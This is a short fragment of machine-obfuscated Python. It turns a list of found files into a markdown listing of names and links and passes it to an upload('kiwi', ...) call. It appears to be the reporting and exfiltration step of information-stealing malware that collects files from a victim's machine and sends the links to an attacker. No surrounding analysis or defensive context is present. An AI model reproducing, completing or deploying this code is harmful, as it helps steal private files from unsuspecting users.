            for ffil in foldlist :#line:970
                a =ffil [0 ].split ("/")#line:971
                fileanme =a [len (a )-1 ]#line:972
                b =ffil [1 ]#line:973
                filetext +=f"└─:open_file_folder: [{fileanme}]({b})\n"#line:974
            filetext +="\n"#line:975
    upload ("kiwi",filetext )
